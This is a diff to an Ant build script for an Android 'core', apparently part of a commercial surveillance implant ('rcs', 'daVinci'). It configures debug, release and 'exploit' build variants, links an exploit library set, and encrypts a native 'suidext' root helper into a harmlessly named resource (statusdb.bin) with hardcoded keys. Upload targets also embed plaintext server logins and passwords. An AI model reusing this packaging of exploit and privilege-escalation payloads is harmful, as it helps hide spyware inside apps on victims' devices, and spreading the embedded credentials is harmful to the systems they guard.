@@ -13,7 +13,6 @@
 		</classpath>
 	</taskdef>
 
-
 	<taskdef name="crypter" classname="com.example.ant.Crypter">
 		<classpath>
 			<pathelement path="${basedir}/../crypter/build/archive/crypter-ant.jar" />
@@ -73,7 +72,7 @@
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="0x5A3D00448D7A912B" inputFile="preprocess/messages.properties.all" outputFile="res/raw/messages.bin" />
 		<delete file="res/raw/statusdb.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="0x5A3D10448D7A912A" inputFile="libs/armeabi/suidext" outputFile="res/raw/statusdb.bin" />
-				
+
 	</target>
 
 	<target name="encrypt-manifest" depends="salt">
@@ -128,19 +127,39 @@
 			<echo message="osversion: @{osversion}" />
 			<echo message="kind: @{kind}" />
 
+			<switch value="@{kind}">
+				<case value="debug">
+					<echo message="set debug" />
+					<antcall target="libsnoexp" />
+					<var name="isdebug" value="true" />
+					<var name="isexploit" value="false" />
+					<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin" overwrite="true" />
+				</case>
+				<case value="release">
+					<echo message="set release" />
+					<antcall target="libsnoexp" />
+					<var name="isdebug" value="false" />
+					<var name="isexploit" value="false" />
+					<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" overwrite="true" />
+				</case>
+				<case value="exploit">
+					<echo message="set exploit" />
+					<antcall target="libsexp" />
+					<var name="isdebug" value="false" />
+					<var name="isexploit" value="true" />
+					<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" overwrite="true" />
+				</case>
+			</switch>
+
 			<iff>
-				<and>
-					<equals arg1="@{osversion}" arg2="v2" />
-					<not>
-						<equals arg1="@{kind}" arg2="debug" />
-					</not>
-				</and>
+				<equals arg1="@{osversion}" arg2="v2" />
 				<then>
-				<!-- Alzare l'api level in caso di 3.x o 4.x -->
+					<!-- Alzare l'api level in caso di 3.x o 4.x -->
 					<echo message="Copy BackGround" />
 					<copy file="preprocess/AndroidManifest.BACKGROUND.xml" tofile="AndroidManifest.xml" overwrite="true">
 						<filterset>
 							<filter token="CAVEAT" value="QUESTO FILE E' GENERATO DA build.xml. MODIFICATE IL FILE IN PREPROCESS" />
+							<filter token="DEBUGGABLE" value="${isdebug}" />
 						</filterset>
 					</copy>
 				</then>
@@ -149,40 +168,14 @@
 					<copy file="preprocess/AndroidManifest.ACTIVITY.xml" tofile="AndroidManifest.xml" overwrite="true">
 						<filterset>
 							<filter token="CAVEAT" value="QUESTO FILE E' GENERATO DA build.xml. MODIFICATE IL FILE IN PREPROCESS" />
+							<filter token="DEBUGGABLE" value="${isdebug}" />
 						</filterset>
 					</copy>
 				</else>
 			</iff>
 
-			<switch value="@{kind}">
-				<case value="debug">
-					<echo message="set debug" />
-					<antcall target="libsnoexp" />
-					<var name="isdebug" value="true" />
-					<var name="isexploit" value="false" />
-					<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin" overwrite="true" />
-					<!-- <delete file="assets/statuslog" />
-					 <copy file="libs/armeabi/suidext" toFile="assets/statusdb" overwrite="true" /> -->
-				</case>
-				<case value="release">
-					<echo message="set release" />
-					<antcall target="libsnoexp" />
-					<var name="isdebug" value="false" />
-					<var name="isexploit" value="false" />
-					<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" overwrite="true" />
-					<!--<delete file="assets/statuslog" />
-					<copy file="libs/armeabi/suidext" toFile="assets/statusdb" overwrite="true" /> -->
-				</case>
-				<case value="exploit">
-					<echo message="set exploit" />
-					<antcall target="libsexp" />
-					<var name="isdebug" value="false" />
-					<var name="isexploit" value="true" />
-					<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" overwrite="true" />
-					<!--<copy file="libs/armeabi/exploit" toFile="assets/statuslog" overwrite="true" />
-					<copy file="libs/armeabi/suidext" toFile="assets/statusdb" overwrite="true" /> -->
-				</case>
-			</switch>
+			<delete file="assets/statuslog" />
+			<delete file="assets/statusdb" />
 
 			<echo message="copy resources and Cfg" />
 			<copy file="preprocess/resources.bin" toFile="res/raw/resources.bin" overwrite="true" />
@@ -278,8 +271,8 @@
 		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file=".\server\android_${version}.zip" />
 		<copy file=".\server\android_${version}.zip" toFile="\\rcs-dev\share\RELEASE\SVILUPPO\cores daVinci\android.zip" overwrite="true" />
 	</target>
-  
-  <target name="updatezenotto">
+
+	<target name="updatezenotto">
 		<updaterelease server="zenotto" login="admin" password="adminp123" file=".\server\android_${version}.zip" />
 		<!-- <copy file=".\server\blackberry_${version}.zip" toFile="W:\RELEASE\SVILUPPO\cores daVinci\android.zip" overwrite="true" /> -->
 	</target>
@@ -291,17 +284,20 @@
 		<echo>ant set-release : make messages.bin and cfg.java, for release</echo>
 		<echo>ant update : uploads the core to castore</echo>
 	</target>
-	
+
 	<target name="set-debug-v2" depends="init">
-	    <set-cfg kind="debug" osversion="v2"></set-cfg>
+		<set-cfg kind="debug" osversion="v2">
+		</set-cfg>
 	</target>
-	
-	<target name="set-exploit-v2" depends="init">
-	    <set-cfg kind="exploit" osversion="v2"></set-cfg>
+
+	<target name="set-release-v2" depends="init">
+		<set-cfg kind="release" osversion="v2">
+		</set-cfg>
 	</target>
-	
+
 	<target name="set-debug-default" depends="init">
-	    <set-cfg kind="debug" osversion="default"></set-cfg>
+		<set-cfg kind="debug" osversion="default">
+		</set-cfg>
 	</target>
 
 	<target name="build" depends="init">
@@ -380,8 +376,7 @@
 		<antcall target="servercore" />
 		<copy file="server/android_${version}.zip" toDir="${destdir}" overwrite="true" />
 
-		<!-- <zipdist destfile="${destdir}/android_sources.zip" /> 
-		-->
+		<zip destfile="${destdir}/android_sources.zip" basedir="." />
 
 		<checksum>
 			<fileset dir="${destdir}/">
